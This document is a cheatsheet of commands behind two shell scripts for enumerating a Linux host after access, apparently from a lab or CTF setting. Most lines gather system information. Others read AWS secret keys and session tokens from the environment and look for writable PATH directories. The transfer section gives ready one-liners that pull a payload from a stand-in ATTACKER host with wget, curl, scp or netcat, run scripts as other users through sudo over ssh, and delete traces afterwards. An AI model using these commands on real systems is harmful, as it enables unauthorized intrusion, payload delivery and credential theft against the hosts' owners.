# os_info.sh & transfer_capability_check.sh — Commands cheatsheet

Quick reference of the exact commands and command patterns used by the two scripts. Use these directly for manual enumeration or to adapt into other tooling. This is concise — no long explanations.

---

## os_info.sh — header / common
- JSON summary (built, not a single command)
- basic timestamp:
  - date '+%Y-%m-%d %H:%M:%S' 2>/dev/null || date '+%F %T'

## Hostname / User
- hostname || cat /proc/sys/kernel/hostname 2>/dev/null || uname -n
- whoami || id -un || printf '%s\n' "${USER:-unknown}"

## System overview / kernel / uname
- uname -a
- cat /proc/version
- uname -m || arch || printf '%s\n' 'unknown'

## OS release
- cat /etc/os-release
- lsb_release -a (fallback)

## CPU / lscpu
- lscpu -a
- lscpu
- grep -m1 'model name' /proc/cpuinfo
- grep -c '^processor' /proc/cpuinfo

## Disk / filesystems / mounts
- df -h 2>/dev/null || df -k 2>/dev/null
- cut -d' ' -f1-3 /proc/mounts | head -n 60
- mount | head -n 60

## Memory
- free -h
- head -n 12 /proc/meminfo
- grep '^MemTotal' /proc/meminfo

## Processes / top
- ps aux
- ps -ef
- ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head -n 20
- top -b -n 1 | head -n 200

## PATH / writable check (shell snippet)
- OLDIFS=$IFS; IFS=":"; total=0; writable=0; for p in $PATH; do
    total=$((total+1));
    [ -z "$p" ] && p="(empty)";
    [ -d "$p" ] && [ -w "$p" ] && printf 'writable:%s\n' "$p";
  done; IFS=$OLDIFS

## Environment variables (selected)
- env | grep "^HOME=" -m1
- env | grep "^SHELL=" -m1
- env | grep "^PATH=" -m1
- env | grep "^USER=" -m1
- env | grep "^LOGNAME=" -m1
- env | grep "^TERM=" -m1
- env | grep "^LANG=" -m1
- env | grep "^EDITOR=" -m1
- env | grep "^PAGER=" -m1

## Networking
- ip a s
- ifconfig -a
- ip r
- route -n
- netstat -rn

## Uptime
- uptime
- awk '{printf("uptime_seconds=%s idle=%s\n", $1, $2)}' /proc/uptime
- cat /proc/uptime

## Disk / I/O tools
- iostat -x -c 1 2 | head -n 200

## vmstat / system stats
- vmstat -s

## CPU frequency
- cpufreq-info | head -n 80

## Package manager detection
- command -v dpkg >/dev/null 2>&1 && printf 'dpkg detected\n'
- command -v rpm >/dev/null 2>&1 && printf 'rpm detected\n'
- command -v apk >/dev/null 2>&1 && printf 'apk detected\n'
- command -v pacman >/dev/null 2>&1 && printf 'pacman detected\n'

## Sudo
- sudo -V 2>&1 | head -n 40

## dmesg and heuristics
- dmesg | tail -n 500
- dmesg | tail -n 500 | awk 'BEGIN{IGNORECASE=1} /secure boot|mok|ima|evm|signature|signed/ {print NR ":" $0}' | head -n 200

## Printers / CUPS
- lpstat -p -d
- head -n 40 /etc/printcap
- pgrep -x cupsd && ps -o pid,cmd -C cupsd

## Time / remote date header
- date '+%Y-%m-%d %H:%M:%S %Z'
- date -u '+%Y-%m-%d %H:%M:%S UTC'
- curl -sI --max-time 6 https://example.com | awk '/^Date:/ {sub(/^Date: /,""); print $0; exit}' || printf 'no remote date\n'

## Time sync tools
- timedatectl status
- ntpstat
- chronyc tracking

## Misc / final markers
- printf or here-docs used to write human headers/footers to logfile
- JSON single-line summary written as first line to logfile

---

## transfer_capability_check.sh — commands & patterns

### Local tools presence
- command -v ssh
- command -v scp
- command -v sftp
- command -v curl
- command -v wget
- command -v nc
- command -v ncat
- command -v netcat
- command -v python
- command -v python3
- command -v perl
- command -v ruby
- command -v ftp
- command -v rsync
- command -v git
- command -v smbclient
- command -v openssl

### PATH writable (same loop as os_info)
- OLDIFS=$IFS; IFS=":"; for p in $PATH; do [ -d "$p" ] && [ -w "$p" ] && printf 'writable: %s\n' "$p"; done; IFS=$OLDIFS

### Environment checks (selected vars)
- env | grep -m1 "^HOME="
- env | grep -m1 "^SHELL="
- env | grep -m1 "^PATH="
- env | grep -m1 "^USER="
- env | grep -m1 "^LOGNAME="
- env | grep -m1 "^TERM="
- env | grep -m1 "^LANG="
- env | grep -m1 "^EDITOR="
- env | grep -m1 "^PAGER="
- env | grep -m1 "^AWS_ACCESS_KEY_ID="
- env | grep -m1 "^AWS_SECRET_ACCESS_KEY="
- env | grep -m1 "^AWS_SESSION_TOKEN="

### Sudo presence & brief
- sudo -V 2>&1 | sed -n '1,20p'

### dmesg
- dmesg | tail -n 80

### OS / kernel / CPU basics
- uname -a
- head -n 3 /proc/version
- lscpu | sed -n '1,30p'
- grep -m1 'model name' /proc/cpuinfo

### Transfer probing — TCP + HTTP patterns
- nc -z -w 3 host port
- nc -w 3 host port
- curl -s --connect-timeout 3 -I "http://host:port/" 
- wget -q --timeout=3 --spider "http://host:port/"

### SSH publickey test (BatchMode, no password prompt)
- ssh -o BatchMode=yes -o ConnectTimeout=3 -p <port> user@host true

### Copy/paste transfer methods (examples)
- HTTP pull (serve on attacker):
  - On attacker: `python3 -m http.server 8000`
  - On target: `wget http://ATTACKER:8000/payload -O /tmp/payload || curl -fsSL http://ATTACKER:8000/payload -o /tmp/payload`

- SCP pull:
  - `scp -P 22 attacker@ATTACKER:/path/to/payload /tmp/payload`

- SFTP interactive:
  - `sftp -oPort=22 attacker@ATTACKER` then `get /path/to/payload /tmp/payload`

- Netcat ad-hoc (varies by nc):
  - On attacker (listen): `nc -l -p 4444 < payload`
  - On target (pull): `nc ATTACKER 4444 > /tmp/payload`
  - Alternate flags: `nc -l 4444 < payload` or `ncat -l 4444 < payload`

- Agent-forwarding pattern:
  - From attacker to intermediate: `ssh -A user@intermediate`
  - From intermediate to target: `scp -P 22 attacker@target:/path /tmp/` (using forwarded key)

### Remote file-write via SSH when scp not possible (remote-cat pattern)
- `ssh -p PORT -t user@host 'sudo -u other -i bash -c "cat > /tmp/os_info.sh && chmod +x /tmp/os_info.sh && /tmp/os_info.sh -v --sign you@host"' < ./os_info.sh`

### Streaming script over ssh to run as another user
- `cat ./os_info.sh | ssh -t user1@TARGET 'sudo -u user2 -i sh -s -- -v --sign you@host' > ~/local_capture.log 2>&1`

### scp with custom port (correct usage)
- `scp -P 31212 ./os_info.sh user1@94.237.49.114:/tmp/os_info.sh`

### sftp interactive put
- `sftp -oPort=31212 user1@94.237.49.114`
  - within sftp: `put ./os_info.sh /tmp/os_info.sh`

### Cleanup remote artifacts (always verify paths)
- `ssh -p PORT user@host 'sudo -u user2 -i sh -c "rm -f /tmp/os_info.sh /tmp/os_info_*.log /home/user2/os_info_*.log"'`

---

## Quick useful one-liners (copy/paste)

- Run os_info.sh remotely as user2 via user1 (interactive sudo via tty):
  - `cat ./os_info.sh | ssh -t user1@TARGET 'sudo -u user2 -i sh -s -- -v --sign you@host' > ~/os_info_TARGET.log 2>&1`

- Copy script to remote with port:
  - `scp -P 31212 ./os_info.sh user1@TARGET:/tmp/os_info.sh`

- Serve payload from attacker and fetch on target:
  - `python3 -m http.server 8000` (attacker)
  - `wget http://ATTACKER:8000/payload -O /tmp/payload` (target)

- Non-interactive SSH key check:
  - `ssh -o BatchMode=yes -o ConnectTimeout=3 -p 22 attacker@ATTACKER true && echo "key ok" || echo "key fail"`

---

## Notes
- Treat logs and env outputs as sensitive.
- Prefer interactive auth flows (ssh + sudo) for safety; avoid embedding passwords in commands.
- The above commands reflect the exact checks and fallbacks used by the two scripts.
